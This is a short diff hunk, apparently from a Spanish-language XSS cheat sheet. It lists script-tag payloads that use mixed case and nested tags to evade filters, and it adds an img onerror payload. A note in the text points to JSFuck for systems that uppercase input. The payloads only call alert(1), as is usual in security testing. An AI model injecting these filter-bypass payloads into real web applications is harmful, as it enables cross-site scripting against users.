@@ -3,6 +3,7 @@
 <SCRIPT>alert(1)</SCRIPT>
 <sCrIpT>alert(1)</sCrIpT>
 <sc<script>ript>alert(1)</sc<script>ript>
+<img src=x onerror=alert(1) />
 ```
 Si el sistema lo transforma todo el mayuscula usar [JSFUCK](https://jsfuck.com/)
 ```
